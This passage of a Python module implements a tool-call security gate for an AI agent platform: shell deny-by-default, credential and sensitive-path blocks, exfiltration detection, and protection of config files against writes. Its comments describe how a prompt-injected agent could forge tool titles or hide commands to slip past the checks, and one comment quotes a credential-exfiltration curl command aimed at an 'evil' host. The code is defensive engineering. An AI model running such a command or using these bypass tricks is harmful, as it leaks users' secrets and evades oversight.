"""Config-driven hook system for KiroCrew's message pipeline.

Hooks intercept messages and tool calls based on rules in config.json.
Supports declarative rules and executable script hooks with timeout/sandboxing.
"""

from __future__ import annotations

import asyncio
import copy
import errno
import fnmatch
import hashlib as _hashlib
import json
import logging
import os
import re
import stat as _stat
import tempfile
import threading
import time
import uuid
from collections.abc import Iterable, Mapping, Sequence
from contextlib import contextmanager
from dataclasses import asdict, dataclass, field
from pathlib import Path

from kiro_crew import platform_compat, security, webhooks

# The xattr ACL-carry policy is shared with atomic_write.atomic_write: both
# install a fresh inode and must reproduce the source's access controls or
# refuse. atomic_write is a leaf module (imported here transitively already via
# platform_compat), so importing these from there keeps one spelling of the
# policy without a cycle.
from kiro_crew.atomic_write import (
    _XATTR_UNSUPPORTED_ERRNOS,
    _is_access_control_xattr,
    _should_carry_xattr,
)
from kiro_crew.config import paths as _config_paths

# Canonical home of the descriptor-path primitive (Windows fail-closed branch
# included). The module-local alias is load-bearing: the gate helpers below
# call it through this module's global, which the seam tests monkeypatch to
# simulate a host where a descriptor's path cannot be read.
from kiro_crew.pinned_fs import fd_real_path as _fd_real_path
from kiro_crew.platform import current_context, redact_via_context
from kiro_crew.platform.governance import (
    CU_CLASS_OBSERVE,
    computer_use_action_classes,
    computer_use_action_from_title,
)

# The bounded, depth-aware target-path walk lives one layer below both this
# module and governance (see the re-export note where the keystone consumers
# are defined). Imported here so ``hooks.TARGET_PATH_KEYS`` / ``hooks.TargetPaths``
# / ``hooks.target_paths`` (and the work caps) stay importable at their historic
# names; hooks keeps its HARD-DENY reading of ``TargetPaths.truncated``.
from kiro_crew.platform.tool_paths import (  # noqa: F401  (re-exported for callers)
    _TARGET_PATH_MAX_NODES,
    _TARGET_PATH_MAX_PATHS,
    TARGET_PATH_KEYS,
    TargetPaths,
    target_paths,
)
from kiro_crew.security import (
    audit_bash_exfiltration,
    is_sensitive_bash_command,
    is_sensitive_path,
    is_sensitive_write_path,
)
from kiro_crew.sel import sel
from kiro_crew.session_directive import CORE_MCP_SERVER
from kiro_crew.validation import _bounded_pattern_search

logger = logging.getLogger(__name__)


# ── Hook Results ──

# Message hook action constants (backward compat — prefer direct string comparison)
HOOK_PASSTHROUGH = "passthrough"
HOOK_REPLY = "reply"
HOOK_MODIFY = "modify"
HOOK_INJECT_CONTEXT = "inject_context"

# Tool hook action constants
TOOL_ALLOW = "allow"
TOOL_AUTO_APPROVE = "auto_approve"
TOOL_DENY = "deny"

# Script hook events (aligned with Kiro CLI)
HOOK_EVENT_AGENT_SPAWN = "AgentSpawn"
HOOK_EVENT_USER_PROMPT_SUBMIT = "UserPromptSubmit"
HOOK_EVENT_PRE_TOOL_USE = "PreToolUse"
HOOK_EVENT_POST_TOOL_USE = "PostToolUse"
HOOK_EVENT_STOP = "Stop"

HOOK_EVENTS = (
    HOOK_EVENT_AGENT_SPAWN,
    HOOK_EVENT_USER_PROMPT_SUBMIT,
    HOOK_EVENT_PRE_TOOL_USE,
    HOOK_EVENT_POST_TOOL_USE,
    HOOK_EVENT_STOP,
)


@dataclass
class HookResult:
    """Result of running message hooks."""

    action: str  # HOOK_PASSTHROUGH, HOOK_REPLY, HOOK_MODIFY, HOOK_INJECT_CONTEXT
    text: str = ""

    @staticmethod
    def passthrough() -> HookResult:
        return HookResult(action=HOOK_PASSTHROUGH)

    @staticmethod
    def reply(text: str) -> HookResult:
        return HookResult(action=HOOK_REPLY, text=text)

    @staticmethod
    def modify(text: str) -> HookResult:
        return HookResult(action=HOOK_MODIFY, text=text)

    @staticmethod
    def inject_context(text: str) -> HookResult:
        return HookResult(action=HOOK_INJECT_CONTEXT, text=text)


@dataclass
class ToolHookResult:
    action: str  # TOOL_ALLOW, TOOL_AUTO_APPROVE, TOOL_DENY
    reason: str = ""
    #: True when a TOOL_DENY came from a hard security check — the attempt
    #: itself is the problem. False when it came from policy STATE (the
    #: governance ceiling ∩ profile), where the same attempt becomes allowed
    #: once the policy loosens. Callers that count refusals against a durable
    #: budget must only count the security kind: an unattended cron auto-pauses
    #: after repeated failures, and a policy denial is not a defect in the job.
    #: The reason string cannot carry this: most security denies never contain
    #: ``DENY_REASON_PREFIX`` at all (the sensitive-path, write-protected-config
    #: and deny-by-default-shell messages do not), so matching on it would
    #: classify a sensitive-path or exfiltration deny as non-security.
    security_deny: bool = True

    @staticmethod
    def _count(action: str, security_deny: bool) -> None:
        """Count one gate verdict. Best-effort; never changes the decision.

        Called by the four factories below and nowhere else, which is what makes
        it fire exactly once per gate consultation. A surface that OVERRIDES the
        gate constructs a result directly (``chat_runner`` downgrades an
        auto-approve to an interactive card this way, twice) and so is not
        counted: the gate was consulted once, and counting every constructed
        object would report one request as two decisions AND keep a count for a
        verdict that was then discarded.

        The two rejected alternatives were instrumenting the 23 exits of
        ``HookManager.on_tool_call`` (23 call sites on a security path) and
        counting in ``__post_init__`` behind a ``from_gate`` flag -- the flag had
        no reader other than the counter itself, so it was state carried purely to
        signal, where calling this from the four factories says the same thing
        with no field at all.

        ``action`` is one of three module constants and ``security_deny`` a bool,
        so the series is bounded by construction -- no reason string, tool name or
        command reaches the recorder.
        """
        try:
            from kiro_crew.metrics.events import APPROVAL_DECISIONS, emit_counter

            emit_counter(
                APPROVAL_DECISIONS,
                {"decision": action, "security_deny": bool(security_deny)},
            )
        except Exception:  # a tool decision must never fail on its telemetry
            logger.debug("approval decision counter failed", exc_info=True)

    @staticmethod
    def allow() -> ToolHookResult:
        ToolHookResult._count(TOOL_ALLOW, False)
        return ToolHookResult(action=TOOL_ALLOW)

    @staticmethod
    def auto_approve() -> ToolHookResult:
        ToolHookResult._count(TOOL_AUTO_APPROVE, False)
        return ToolHookResult(action=TOOL_AUTO_APPROVE)

    @staticmethod
    def deny(reason: str) -> ToolHookResult:
        """Deny on a hard security check — the attempt is the problem."""
        ToolHookResult._count(TOOL_DENY, True)
        return ToolHookResult(action=TOOL_DENY, reason=reason, security_deny=True)

    @staticmethod
    def deny_policy(reason: str) -> ToolHookResult:
        """Deny on policy STATE, which the same attempt can outlive.

        Kept distinct from :meth:`deny` so a caller counting refusals against a
        durable budget (cron auto-pause) does not treat a governance ceiling as
        a defect in what it attempted.
        """
        ToolHookResult._count(TOOL_DENY, False)
        return ToolHookResult(action=TOOL_DENY, reason=reason, security_deny=False)


# ── Config Types ──


@dataclass
class ContextRule:
    """Inject context when any trigger keyword matches."""

    triggers: list[str] = field(default_factory=list)
    context: str = ""


@dataclass
class AutoReplyHook:
    """Auto-reply without LLM for pattern matches."""

    pattern: str = ""
    reply: str = ""
    exact: bool = False


@dataclass
class TransformHook:
    """Transform message before sending to LLM."""

    pattern: str = ""
    prefix: str = ""
    suffix: str = ""


_BUNDLED_AUTO_APPROVE_TOOLS: list[str] = []


def _coerce_bool(value: object, default: bool) -> bool:
    """Coerce an operator-editable config value to a bool without ``bool()`` traps.

    ``config.json`` is hand-editable, and plain ``bool("false")`` is ``True`` in
    Python — a footgun that would let ``"disable_all": "false"`` silently turn
    OFF every opt-out-capable protection.  A real bool is returned as-is; a
    recognized string spelling (``true``/``false``/``1``/``0``/``yes``/``no``/
    ``on``/``off``, case-insensitive) maps to its value; anything else falls back
    to *default* (chosen by the caller to fail safe).
    """
    if isinstance(value, bool):
        return value
    if isinstance(value, str):
        v = value.strip().lower()
        if v in ("true", "1", "yes", "on"):
            return True
        if v in ("false", "0", "no", "off"):
            return False
    return default


@dataclass
class UserDeniedPattern:
    """A user-authored denied-command pattern (Settings > Security 'add your own')."""

    id: str = ""
    pattern: str = ""
    enabled: bool = True
    # Operator-authored explanation shown to the agent when this rule fires,
    # INSTEAD of leaving it to infer intent from the raw regex. Metadata only —
    # it never participates in matching. Declared last so existing positional
    # construction (``UserDeniedPattern("id", "pat", True)``) keeps working.
    note: str = ""

    @classmethod
    def from_dict(cls, data: dict) -> UserDeniedPattern:
        pid = str(data.get("id", "") or "").strip()
        if not pid:
            pid = uuid.uuid4().hex[:12]
        return cls(
            id=pid,
            pattern=str(data.get("pattern", "") or ""),
            # Default a malformed ``enabled`` to True: a user-authored deny rule
            # is present because the operator wanted it enforced, so ambiguous
            # junk should keep it ON (fail safe = keep denying).
            enabled=_coerce_bool(data.get("enabled", True), default=True),
            # A malformed note degrades to "" rather than raising: it is
            # cosmetic, so junk here must never abort gateway boot nor weaken
            # the rule it annotates.
            note=str(data.get("note", "") or ""),
        )

    def to_dict(self) -> dict:
        return {
            "id": self.id,
            "pattern": self.pattern,
            "enabled": self.enabled,
            "note": self.note,
        }


@dataclass
class HooksConfig:
    """Loaded from config.json ``hooks`` section."""

    auto_approve_tools: list[str] = field(default_factory=list)
    auto_approve_sources: list[str] = field(default_factory=list)
    auto_approve_subagent_spawn: bool = False
    auto_approve_subagent_tools: bool = False
    auto_deny_tools: list[str] = field(default_factory=list)
    auto_replies: list[AutoReplyHook] = field(default_factory=list)
    transforms: list[TransformHook] = field(default_factory=list)
    context_rules: list[ContextRule] = field(default_factory=list)
    # User-configurable denied-command opt-out state (Settings > Security),
    # persisted nested under the ``hooks.denied_commands`` sub-object.
    denied_commands_disabled_ids: list[str] = field(default_factory=list)
    denied_commands_disable_all: bool = False
    denied_commands_user_added: list[UserDeniedPattern] = field(default_factory=list)

    @classmethod
    def from_dict(cls, data: dict) -> HooksConfig:
        """Parse hooks config from a dict (config.json ``hooks`` section).

        ``config.json`` is operator-editable and this method runs at gateway
        boot (``cli_server``/``slack/gateway``), so every field is parsed
        defensively: a malformed scalar/string where a list or list-of-dicts is
        expected (e.g. ``"auto_replies": 1`` or ``"auto_approve_tools": "x"``)
        must degrade to the empty default rather than raise and abort startup.
        """
        if not isinstance(data, dict):
            data = {}

        def _dict_items(key: str) -> list:
            """List of dict entries under *key*; junk (non-list, non-dict items) dropped."""
            raw = data.get(key, [])
            if not isinstance(raw, list):
                return []
            return [h for h in raw if isinstance(h, dict)]

        def _str_list(value) -> list:
            """Non-empty strings from *value* (a list); anything else -> []."""
            if not isinstance(value, list):
                return []
            return [s for s in value if isinstance(s, str)]

        auto_replies = [
            AutoReplyHook(
                pattern=h.get("pattern", ""),
                reply=h.get("reply", ""),
                exact=h.get("exact", False),
            )
            for h in _dict_items("auto_replies")
        ]
        transforms = [
            TransformHook(
                pattern=h.get("pattern", ""),
                prefix=h.get("prefix", ""),
                suffix=h.get("suffix", ""),
            )
            for h in _dict_items("transforms")
        ]
        context_rules = [
            ContextRule(
                triggers=r.get("triggers", []),
                context=r.get("context", ""),
            )
            for r in _dict_items("context_rules")
        ]
        user_approve = _str_list(data.get("auto_approve_tools", []))
        merged_approve = list(dict.fromkeys(_BUNDLED_AUTO_APPROVE_TOOLS + user_approve))
        # Denied-commands opt-out state is stored under a nested sub-object so it
        # can grow independently of the flat top-level hook keys.  config.json is
        # operator-editable, so each nested value is defended against non-list /
        # non-dict junk: a malformed scalar (e.g. ``"user_added": 1``) must not
        # raise at gateway boot — it degrades to "no opt-out" instead.
        dc = data.get("denied_commands", {})
        if not isinstance(dc, dict):
            dc = {}
        raw_user_added = dc.get("user_added", [])
        if not isinstance(raw_user_added, list):
            raw_user_added = []
        user_added = [
            UserDeniedPattern.from_dict(u)
            for u in raw_user_added
            if isinstance(u, dict) and str(u.get("pattern", "") or "").strip()
        ]
        raw_disabled_ids = dc.get("disabled_ids", [])
        if not isinstance(raw_disabled_ids, list):
            raw_disabled_ids = []
        disabled_ids = [str(i) for i in raw_disabled_ids if isinstance(i, str) and i]
        return cls(
            auto_approve_tools=merged_approve,
            auto_approve_sources=_str_list(data.get("auto_approve_sources", [])),
            # Fail safe: malformed auto-approve flags must NOT silently widen
            # approval (a string "false" is truthy under plain bool()) — default
            # to False so ambiguous junk keeps interactive approval on.
            auto_approve_subagent_spawn=_coerce_bool(
                data.get("auto_approve_subagent_spawn", False), default=False
            ),
            auto_approve_subagent_tools=_coerce_bool(
                data.get("auto_approve_subagent_tools", False), default=False
            ),
            auto_deny_tools=_str_list(data.get("auto_deny_tools", [])),
            auto_replies=auto_replies,
            transforms=transforms,
            context_rules=context_rules,
            denied_commands_disabled_ids=disabled_ids,
            # Fail safe: a malformed ``disable_all`` (incl. the string "false",
            # which is truthy under plain bool()) must NOT silently disable every
            # built-in protection — unknown junk defaults to False (denies stay on).
            denied_commands_disable_all=_coerce_bool(dc.get("disable_all", False), default=False),
            denied_commands_user_added=user_added,
        )

    def to_dict(self) -> dict:
        """Serialize hook config for persistence / API round-trip.

        Does NOT re-emit ``_BUNDLED_AUTO_APPROVE_TOOLS`` (they are injected on
        load and would accrete in config.json on every save).  The
        denied-commands opt-out state is written back nested under
        ``denied_commands``.
        """
        return {
            "auto_approve_tools": [
                t for t in self.auto_approve_tools if t not in _BUNDLED_AUTO_APPROVE_TOOLS
            ],
            "auto_approve_sources": list(self.auto_approve_sources),
            "auto_approve_subagent_spawn": self.auto_approve_subagent_spawn,
            "auto_approve_subagent_tools": self.auto_approve_subagent_tools,
            "auto_deny_tools": list(self.auto_deny_tools),
            "auto_replies": [asdict(h) for h in self.auto_replies],
            "transforms": [asdict(h) for h in self.transforms],
            "context_rules": [asdict(r) for r in self.context_rules],
            # The denied-command opt-out state is NOT persisted in config.json's
            # hooks section — it lives in the keystone ``denied_commands.json``
            # (see ``denied_commands_state``/``load_denied_commands_state``). We
            # still surface it here (nested) for the round-trip API + tests, but
            # config.json readers ignore it (the boot path re-sources it from the
            # keystone file).
            "denied_commands": self.denied_commands_state(),
        }

    def denied_commands_state(self) -> dict:
        """The opt-out state as the keystone ``denied_commands.json`` object."""
        return {
            "disabled_ids": list(self.denied_commands_disabled_ids),
            "disable_all": self.denied_commands_disable_all,
            "user_added": [p.to_dict() for p in self.denied_commands_user_added],
        }


# ── Spawn auto-approve identity ──


def event_is_spawn_run(event: object) -> bool:
    """True when a permission event is genuinely the ``spawn_run`` MCP tool.

    The ``auto_approve_subagent_spawn`` rung must key on canonical,
    NON-model-authored identity: ``event.title`` is LLM-authored prose (for
    shell tools ``select_tool_title`` even prefers the model's description),
    so ANY event whose title is forged to ``spawn_run`` — a shell command, a
    re-titled ``send_file``, anything — must never satisfy this rung.

    Canonical identity only, deny-by-default: ``event.tool_name`` (from
    ``_meta.kiro``, never model-authored) must be ``spawn_run``, carry the
    ``mcp_identity_trusted`` provenance flag (non-emptiness alone is not
    proof of provenance; a future inline population path must fail closed),
    and be served by the crew's own MCP server (``CORE_MCP_SERVER``), so a
    foreign server or a built-in that merely NAMES a tool ``spawn_run``
    cannot ride the rung.

    The title must ALSO read ``spawn_run``. Not as identity — the title is
    forgeable and never sufficient — but because the channel PreToolUse gate
    (``build_tool_gate``) keys deny rules on the title: a genuine spawn whose
    display title was rephrased must fall to the approval ladder rather than
    let this rung approve past a title-keyed deny that would otherwise have
    fired. This exactly preserves the rung's pre-fix approval surface (title
    ``spawn_run``), minus the forgeries.

    There is deliberately NO title fallback: on a backend that does not emit
    ``_meta.kiro`` (or on the correlated provenance-cache miss) the rung
    simply does not fire and the request falls to the channel's normal
    approval ladder (session trust / YOLO / interactive) — a downgrade,
    never a hard block.
    """
    return (
        (getattr(event, "title", "") or "") == "spawn_run"
        and (getattr(event, "tool_name", "") or "") == "spawn_run"
        and bool(getattr(event, "mcp_identity_trusted", False))
        and (getattr(event, "mcp_server_name", "") or "") == CORE_MCP_SERVER
    )


# ── HookManager ──


class HookManager:
    """Process messages and tool calls through config-driven rules."""

    def __init__(self, config: HooksConfig | None = None):
        self._config = config or HooksConfig()

    def reload(self, config: HooksConfig) -> None:
        """Hot-reload hooks config."""
        self._config = config

    @property
    def auto_approve_subagent_spawn(self) -> bool:
        return self._config.auto_approve_subagent_spawn

    @property
    def auto_approve_subagent_tools(self) -> bool:
        return self._config.auto_approve_subagent_tools

    # ── Message hooks ──

    def on_message(self, text: str) -> HookResult:
        """Run message hooks. Returns first match or passthrough."""
        lower = text.lower()

        # Auto-replies (first match wins)
        for ar_hook in self._config.auto_replies:
            if ar_hook.exact:
                if lower == ar_hook.pattern.lower():
                    return HookResult.reply(ar_hook.reply)
            else:
                if ar_hook.pattern.lower() in lower:
                    return HookResult.reply(ar_hook.reply)

        # Transforms (first match wins)
        for tf_hook in self._config.transforms:
            if tf_hook.pattern.lower() in lower:
                modified = text
                if tf_hook.prefix:
                    modified = f"{tf_hook.prefix}\n{modified}"
                if tf_hook.suffix:
                    modified = f"{modified}\n{tf_hook.suffix}"
                return HookResult.modify(modified)

        # Context injection (all matching rules)
        injected: list[str] = []
        for rule in self._config.context_rules:
            if any(t.lower() in lower for t in rule.triggers):
                injected.append(rule.context)
        if injected:
            return HookResult.inject_context("\n\n".join(injected))

        return HookResult.passthrough()

    # ── Tool hooks ──

    def on_tool_call(
        self,
        tool_name: str,
        *,
        session_key: str = "",
        agent: str = "",
        app: str = "",
        tool_kind: str = "",
        raw_params: dict | None = None,
        command: str | None = None,
        is_shell: bool = False,
        mcp_server_name: str = "",
        mcp_tool_name: str = "",
        resolved_agent: str = "",
    ) -> ToolHookResult:
        """Check if a tool should be auto-approved, denied, or handled normally.

        ``tool_name`` is the display title/pill label. For shell tools it may
        be an LLM-authored ``description`` string rather than the literal
        command (``select_tool_title`` in ``acp/_dispatch.py`` prefers
        ``description`` over ``command``), so it is UNTRUSTED for security
        decisions. When the caller has the raw executable command it MUST pass
        it as ``command=``; every security check then also runs against the
        real command, closing the bypass where a benign title/description hid
        a dangerous command (``auto_deny_tools`` and the sensitive-path /
        credential-read protections both keyed off the title otherwise).
        Over-blocking is the safe direction: a match on EITHER the title or the
        command denies. Auto-approve stays keyed on the title only — failing to
        auto-approve merely falls through to interactive approval.

        The optional keyword-only ``session_key`` / ``agent`` / ``app`` identify
        the calling surface so the governance ceiling ∩ active-profile can be
        resolved and a tool/MCP call denied even when the kiro agent config
        granted it (the governance headline behavior).  They default to ``""`` so
        every existing caller is unaffected; a caller that supplies identity opts
        into per-surface governance.

        ``tool_kind`` (the ACP semantic kind: ``read``/``edit``/``fetch``/…) and
        ``raw_params`` (the real tool arguments — ``path``/``url``) let the gate
        enforce the path/host scopes a display title cannot carry
        (``filesystem.write``, ``network.egress``).  Both default to empty, so a
        caller that does not thread them only loses those two arg-derived scopes,
        never the title-derived ones.  ``raw_params`` additionally feeds the deny
        tiers a synthesized ``file-search …`` target (``_search_deny_target``) for a
        search-shaped call, whose walked root and depth cap exist ONLY in its
        arguments; a caller that omits ``raw_params`` loses that coverage too.

        ``is_shell`` enforces deny-by-default for shell tools: when a caller
        reports a shell tool (``is_shell=True``) but cannot supply the raw
        ``command`` (extraction failed — e.g. malformed params), the title
        alone is not a trustworthy basis for a decision, so the call is DENIED
        rather than silently falling through to the title-only checks. Callers
        that always pass a resolved command can leave ``is_shell`` at its
        default; those forwarding an event should pass both the command and the
        event's ``is_shell`` flag.

        ``mcp_server_name`` is the NON-model-authored MCP server identity from
        the ACP event's ``_meta.kiro.mcpServerName`` (``AcpEvent.mcp_server_name``),
        set by kiro-cli ONLY for MCP-served tool calls and empty for shell /
        built-in tools. It is the trusted discriminator "this call was genuinely
        served by MCP server X" — as opposed to the LLM-authored ``tool_name``
        title, which a prompt-injected agent can forge (e.g. titling a Bash call
        ``mcp__<app>:srv__x``). The app-own-server auto-approve keys on THIS, never
        on the title, so a forged title cannot win an auto-approval. Empty (the
        default, or a backend that omits ``_meta.kiro``) fails closed: no match.

        ``mcp_tool_name`` is the sibling NON-model-authored tool identity from
        ``_meta.kiro.toolName`` (``AcpEvent.tool_name``). Despite the name it is
        NOT MCP-only: kiro-cli sets it for every tool call it serves, built-ins
        included, and sets ``mcp_server_name`` only for MCP-served ones. It is
        therefore evaluated on the deny and governance planes whenever present,
        server or no server -- otherwise a built-in's real name (``fs_write``)
        reaches no check at all and a deny/ceiling rule naming it is bypassable
        behind a benign model-authored title. With both present the
        gate reconstructs the canonical ``mcp__<server>__<tool>`` name and runs
        the effective deny set AND the governance ceiling against it as well as
        against the title — because the ``tool_name`` title above is LLM-authored
        prose (``select_tool_title`` prefers the model's ``description``) and may
        not carry the canonical form a per-tool MCP policy matches on. Without
        this, an ordinary MCP call whose policy-denied tool arrives under a benign
        description would pass the gate and reach the human prompt, where an
        "allow" would run a tool the ceiling forbids.

        The canonical name is ADDED to those checks, never SUBSTITUTED for the
        title: the two carry different security signals. The canonical name is
        the trusted statement of WHICH MCP tool is being invoked, and is what a
        per-tool ceiling or deny rule matches. The title and raw command carry
        the path, command and content signals that a tool identity does not
        express — ``~/.aws/credentials`` read through an innocuously named MCP
        tool is denied by the title, not by the identity. Different dimensions,
        so a deny on EITHER denies the call. Empty (no ``_meta.kiro.toolName``)
        means the tool cannot be identified, so the own-server auto-approve does
        NOT fire (fall through to interactive approval — fail-closed).
        """
        # Deny-by-default: a shell tool whose command could not be recovered
        # must not be evaluated on the untrusted title alone — that is the very
        # bypass this gate closes. Reject instead of falling through.
        #
        # This refusal is UNCONDITIONAL, and deliberately has no operator override.
        # An override was implemented and removed on this PR: ``ToolHookResult``
        # carries only ``allow`` / ``auto_approve`` / ``deny``, so a suppressed call
        # can at best return ``allow``, and ``allow`` falls through to
        # patterns / trust-reads / trust / YOLO / interactive in the dashboard
        # runner. Under YOLO — or a trust grant, or native-crew auto-approve — the
        # unverified command would then execute with no human ever seeing it, which
        # is precisely what this gate exists to prevent, in exactly the
        # configuration an operator who wants the convenience is likeliest to run.
        # Barring the hook-level auto-approve branches is NOT sufficient, because
        # the decision is re-made downstream.
        #
        # The false-positive that motivated the override (a provider payload shape
        # this build does not recognize yields no command even for an ordinary
        # call — see ``AcpEvent.shell_command``) is real, but the fix belongs in
        # recognizing the payload shape, not in admitting commands no gate read.
        # Making this suppressible would need a fourth action meaning "force the
        # interactive prompt, and let no downstream tier auto-grant it".
        if is_shell and not command:
            return ToolHookResult.deny(
                "Blocked: shell command could not be verified for security "
                "policy (deny-by-default)"
            )

        # Strip display prefixes (e.g. "Running: ls *" → "ls *") so config
        # patterns like "ls" or "rm *" match without the prefix.
        normalized = _normalize_tool_name(tool_name)

        # Security checks run against the raw command (when available) AND the
        # display title. The command is the ground truth for shell tools; the
        # title is retained so non-shell tools (whose identifier IS the title)
        # stay gated and so a dangerous title can't slip through behind a
        # benign command.
        security_targets = [normalized]
        if command and command not in security_targets:
            security_targets.append(command)

        # Sensitive path protection (always enforced, before all other checks).
        # kiro-cli adds "Reading "/"Running: " display prefixes; the
        # claude-agent-acp adapter does NOT (its file-read title is the bare
        # path, its Bash title the bare command). So the prefix only HINTS at
        # the tool kind — we must run every check on every target regardless of
        # prefix, or credential reads slip through on the Claude Code provider.
        # Each target is the normalized title AND (for shell tools) the raw
        # command, so an LLM-authored benign title can't hide a dangerous
        # command from any of these gates. is_sensitive_path resolves the value
        # as a path: a real file-read title ("~/.aws/credentials") matches,
        # while a bash command ("cat ~/.aws/credentials") resolves to a
        # non-sensitive path and is instead caught by is_sensitive_bash_command.
        # The always-on gates below are keyed by rule id, so resolve the effective
        # regex set to ids ONCE here and thread it in. ``None`` means all enabled,
        # which is what the callers outside this gate (cron command vetting,
        # computer-use input vetting) keep passing.
        #
        # ONE context snapshot for the WHOLE gate, reused by the catalog checks
        # further down. Reading ``current_context()`` twice let a live ceiling
        # refresh land between the reads, so a single tool call could be judged
        # half under the old ceiling and half under the new one. The direction
        # that matters: the structural IMDS/exfil checks here are the only ones
        # that catch an ENCODED address (``credential-exfil-imds-any`` exists
        # precisely because the curl/wget patterns match a literal dotted quad),
        # so a governance pin arriving after this line could never be applied to
        # the encoded form — honouring a pin late is not honouring it.
        ctx = current_context()
        enabled_ids = security.enabled_rule_ids(self._effective_denied(ctx))
        for target in security_targets:
            if is_sensitive_path(target):
                return ToolHookResult.deny(f"Blocked: access to sensitive path: {target}")
            # execute_bash (prefixed or bare) — check for reads of sensitive paths.
            reason = is_sensitive_bash_command(target, enabled_ids=enabled_ids)
            if reason:
                return ToolHookResult.deny(reason)
            # Data-exfiltration / reverse-shell command shapes.
            # The anti-exfil patterns previously lived only in the passive audit
            # path (scan_history / dashboard count) and were never enforced at
            # invocation, so a hijacked agent could `curl -d @~/.aws/credentials
            # evil` or open a reverse shell unblocked. Deny them at the gate —
            # against the raw command too, not just the title.
            reason = audit_bash_exfiltration(target, enabled_ids=enabled_ids)
            if reason:
                return ToolHookResult.deny(reason)
        # The display title is backend-variable and may NOT carry the path (an
        # "Editing <file>" / generic "code" title does not). The real path lives
        # in raw_params['path'] for file read/edit tools — run the SAME always-on
        # keystone on it so an edit/write to ~/.ssh, ~/.aws, or the governance
        # trust-root files (security_policy.json / profiles) is blocked even when
        # the title hides it. This is the keystone the governance model leans on
        # (agent-cannot-rewrite-its-own-ceiling), so it must not be title-gated.
        # EVERY accepted spelling, and a deny on any of them denies: a backend that
        # sends ``filePath`` (the camel-case form the search plane has always
        # accepted) reached NEITHER of the two snake_case reads this used to do, so
        # a write to ~/.ssh under that key was never gated and the human was asked
        # to approve a path the keystone should have refused outright.
        if raw_params:
            real_paths = target_paths(raw_params)
            if real_paths.truncated:
                # The walk hit its work cap, so the list may be INCOMPLETE. A
                # partial scan must not be trusted as a full one — deny, same
                # deny-by-default shape as the unrecoverable shell command
                # above. No legitimate tool call carries hundreds of target
                # paths, so this refuses only attacker-shaped payloads.
                return ToolHookResult.deny(
                    "Blocked: tool arguments too large to verify for sensitive "
                    "paths (deny-by-default)"
                )
            for real_path in real_paths:
                if is_sensitive_path(real_path):
                    return ToolHookResult.deny(f"Blocked: access to sensitive path: {real_path}")
        # Config files are WRITE-protected (reads stay allowed): block the agent's
        # file-EDIT tool from modifying config.json / config.local.json so a
        # prompt-injected agent cannot rewrite its own resource ceilings
        # (concurrent subagents, turn budget, warm-pool size) to drive host
        # resource exhaustion. Gated
        # on the ACP ``edit`` kind (the fs_write/code tool) so a plain read of
        # config is unaffected — the dashboard file viewer, ``cat``, and knowledge
        # indexing legitimately read config.json. Bash writes (``tee``/``>``/
        # ``cp``-dest) are blocked separately by ``is_sensitive_bash_command``
        # above; this branch covers the file-EDIT tool.
        #
        # Empty/unknown ``tool_kind`` (the ACP kind field is spec-optional; some
        # backends omit it) is DELIBERATELY not mirrored here.
        # ``governance._scopes_for_call`` (platform/governance.py) infers BOTH
        # filesystem.read AND filesystem.write from a lone ``path`` when the kind
        # is empty, because it is a *policy intersection* where an ungoverned
        # scope permits. This gate is a HARD deny, so applying that same shape
        # inference would also block legitimate config READS that arrive without a
        # kind — regressing the read-allowance that is the whole point of the
        # write-only tier. Empty-kind edits are rare (the ACP fs_write tool sets
        # ``edit``); not hard-denying them keeps the two write-gates from drifting
        # into a read regression, and the bash gate covers the shell surface.
        if tool_kind == _EDIT_TOOL_KIND and raw_params:
            # Same spelling coverage as the sensitive-path keystone above, for the
            # same reason: the write-protected tier is worthless if a config edit
            # can name its target under a key the check never reads.
            for wpath in target_paths(raw_params):
                if is_sensitive_write_path(wpath):
                    return ToolHookResult.deny(
                        f"Blocked: modification of write-protected config path: {wpath}"
                    )
        # Built-in security deny list (always enforced).  Route through the
        # active PlatformContext's PolicyAuthority so the Amazon companion's
        # ADD-only deny overlay (+ internal patterns) applies when loaded.  The
        # standalone Default authority uses an empty overlay, so this resolves
        # to ``security.is_denied(name, auto_deny_tools)`` exactly as before —
        # no recursion (PolicyAuthority.is_denied calls security.is_denied with
        # the overlay patterns appended; security.is_denied never calls back).
        # Check the raw command (ground truth) as well as the normalized and
        # original title forms.
        # Reuses the ONE snapshot taken at the top of the gate — see the comment
        # there. A second read here would let a ceiling refresh split this call's
        # verdict across two policy states.
        authority = ctx.security
        denied_regexes = self._effective_denied(ctx)
        denied_notes = self._denied_notes()
        deny_targets = [normalized, tool_name]
        # The canonical ``mcp__<server>__<tool>`` identity, when kiro-cli supplied
        # BOTH trusted ``_meta.kiro`` fields. ``select_tool_title`` prefers the
        # model's prose ``description``, so ``tool_name`` for an MCP call may be
        # "Look up the weather" rather than the canonical form a per-tool deny
        # rule or MCP policy matches on. Reconstructing it here — on the COMMON
        # path, before the deny floor and governance — is what makes a rule keyed
        # on the real tool identity bind for every consumer of this gate, not
        # only for the first-party own-server auto-approve below.
        #
        # ADDITIVE, never a substitution: the display title and the raw command
        # stay in every check they were already in. They are not competing
        # spellings of one fact — the canonical name is the trusted statement of
        # WHICH tool runs, which is what a per-tool rule matches, while the title
        # and command carry the path/command/content signals that identity does
        # not express. Each covers a security dimension the other cannot, so both
        # are evaluated and a deny on either denies. Both fields empty (a non-MCP
        # call, or a backend that omits ``_meta.kiro``) leaves every target
        # exactly as before.
        canonical_mcp_name = (
            f"mcp__{mcp_server_name}__{mcp_tool_name}" if mcp_server_name and mcp_tool_name else ""
        )
        if canonical_mcp_name:
            deny_targets.append(canonical_mcp_name)
        # The trusted tool identity on its own, which is the ONLY form a built-in
        # carries: kiro-cli sets ``_meta.kiro.toolName`` for every tool call but
        # ``mcpServerName`` only for MCP-served ones, so the canonical form above
        # is empty for a built-in and its real name would otherwise reach no check
        # at all -- leaving ``deny = ["fs_write"]`` bypassable behind a benign
        # model-authored title. Appended whenever present, MCP or not, because a
        # deny target can only ever DENY: an identity the model could influence
        # cannot waive a rule here, at most it matches one it did not need to.
        if mcp_tool_name and mcp_tool_name not in deny_targets:
            deny_targets.append(mcp_tool_name)
        # What the GOVERNANCE plane is asked about, which is NOT the same string,
        # because that plane has a SERVER level the deny plane does not and it
        # matches canonical references rather than raw titles.
        #
        # The ``mcp__<server>__<tool>`` title is a LOSSY encoding: the parser that
        # reads it splits on the LAST ``__``, so it can carry any server name but
        # never a tool name containing ``__``. ``@github`` + ``repo__delete``
        # encodes to ``mcp__github__repo__delete`` and reads back as server
        # ``github__repo`` with tool ``delete``, so a ``deny @github/repo__delete``
        # ceiling never binds and a human is asked to approve a tool the policy
